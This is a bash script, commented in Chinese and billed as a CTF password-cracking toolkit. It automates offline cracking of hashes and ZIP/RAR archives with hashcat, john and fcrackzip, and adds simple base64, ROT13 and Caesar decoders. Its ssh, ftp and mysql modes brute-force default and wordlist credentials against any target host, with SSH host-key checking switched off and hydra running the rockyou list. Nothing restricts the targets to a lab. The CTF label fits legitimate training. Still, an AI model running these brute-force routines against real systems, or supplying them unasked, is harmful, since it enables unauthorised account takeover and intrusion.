#!/bin/bash
# CTF密码破解脚本集合
# 用法: ctf-crack.sh <模式> <目标>

MODE="$1"
TARGET="$2"

show_help() {
    echo "=========================================="
    echo "CTF密码破解脚本"
    echo "=========================================="
    echo ""
    echo "用法: $0 <模式> <目标>"
    echo ""
    echo "模式:"
    echo "  hash      - 自动识别hash类型并破解"
    echo "  zip       - 破解ZIP密码"
    echo "  rar       - 破解RAR密码"
    echo "  ssh       - SSH弱口令"
    echo "  ftp       - FTP弱口令"
    echo "  mysql     - MySQL弱口令"
    echo "  base64    - Base64多层解码"
    echo "  rot13     - ROT13解码"
    echo "  caesar    - 凯撒密码暴力破解"
    echo ""
    echo "示例:"
    echo "  $0 hash hash.txt"
    echo "  $0 zip secret.zip"
    echo "  $0 ssh 192.168.1.1"
}

if [ -z "$MODE" ]; then
    show_help
    exit 1
fi

WORDLIST="/usr/share/wordlists/rockyou.txt"
[ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/fasttrack.txt"

case "$MODE" in
    hash)
        echo "=========================================="
        echo "Hash破解"
        echo "=========================================="
        
        [ ! -f "$TARGET" ] && echo "错误: 文件不存在" && exit 1
        
        echo "[*] Hash内容: $(cat "$TARGET")"
        echo ""
        echo "[*] Hash类型识别:"
        hashid -m "$TARGET" 2>/dev/null | head -10
        
        echo ""
        echo "[*] 使用hashcat尝试破解..."
        declare -A HASH_MODES=(
            ["md5"]="0" ["sha1"]="100" ["sha256"]="1400"
            ["sha512"]="1800" ["ntlm"]="1000" ["md5crypt"]="500"
        )
        
        for type in md5 sha1 sha256 sha512; do
            echo "[*] 尝试 $type 模式..."
            hashcat -a 0 -m ${HASH_MODES[$type]} "$TARGET" "$WORDLIST" --force 2>/dev/null
            [ $? -eq 0 ] && echo "[+] 破解成功!" && hashcat -a 0 -m ${HASH_MODES[$type]} "$TARGET" "$WORDLIST" --show && exit 0
        done
        
        echo "[*] 使用john破解..."
        john "$TARGET" --wordlist="$WORDLIST"
        john "$TARGET" --show
        ;;
    
    zip)
        echo "=========================================="
        echo "ZIP密码破解"
        echo "=========================================="
        
        [ ! -f "$TARGET" ] && echo "错误: 文件不存在" && exit 1
        
        echo "[*] 检查是否伪加密..."
        unzip -P "" "$TARGET" 2>/dev/null && echo "[+] 伪加密成功!" && exit 0
        
        echo "[*] 使用fcrackzip破解..."
        fcrackzip -b -c a -l 1-6 "$TARGET" 2>/dev/null
        
        echo "[*] 使用john破解..."
        zip2john "$TARGET" > /tmp/zip.hash 2>/dev/null
        john /tmp/zip.hash --wordlist="$WORDLIST"
        john /tmp/zip.hash --show
        ;;
    
    rar)
        echo "=========================================="
        echo "RAR密码破解"
        echo "=========================================="
        
        [ ! -f "$TARGET" ] && echo "错误: 文件不存在" && exit 1
        
        rar2john "$TARGET" > /tmp/rar.hash 2>/dev/null
        john /tmp/rar.hash --wordlist="$WORDLIST"
        john /tmp/rar.hash --show
        ;;
    
    ssh|ftp|mysql)
        echo "=========================================="
        echo "${MODE^^}弱口令测试"
        echo "=========================================="
        
        echo "[*] 常见用户名密码组合..."
        for user in root admin test user guest; do
            for pass in root admin password 123456 "" "$user" "${user}123"; do
                case "$MODE" in
                    ssh) result=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$user@$TARGET" "echo success" 2>/dev/null) ;;
                    ftp) result=$(curl -s "ftp://$user:$pass@$TARGET/" 2>/dev/null) && result="success" ;;
                    mysql) result=$(mysql -h "$TARGET" -u "$user" -p"$pass" -e "SELECT 1" 2>/dev/null) && result="success" ;;
                esac
                [ "$result" == "success" ] && echo "[+] 成功: $user:$pass" && exit 0
            done
        done
        
        echo "[*] 使用hydra暴力破解..."
        hydra -l root -P "$WORDLIST" $MODE://"$TARGET" -t 4
        ;;
    
    base64)
        echo "=========================================="
        echo "Base64多层解码"
        echo "=========================================="
        result="$TARGET"
        for i in {1..10}; do
            decoded=$(echo "$result" | base64 -d 2>/dev/null)
            [ $? -ne 0 ] || [ -z "$decoded" ] && break
            result="$decoded"
            echo "Layer $i: $result"
        done
        ;;
    
    rot13)
        echo "$TARGET" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
        ;;
    
    caesar)
        echo "=========================================="
        echo "凯撒密码暴力破解"
        echo "=========================================="
        for i in $(seq 1 25); do
            echo -n "Shift $i: "
            echo "$TARGET" | tr 'A-Za-z' "$(echo {A-Z} | tr -d ' ' | cut -c$((i+1))-26)$(echo {A-Z} | tr -d ' ' | cut -c1-$i)$(echo {a-z} | tr -d ' ' | cut -c$((i+1))-26)$(echo {a-z} | tr -d ' ' | cut -c1-$i)"
        done
        ;;
    
    *)
        echo "未知模式: $MODE"
        show_help
        exit 1
        ;;
esac
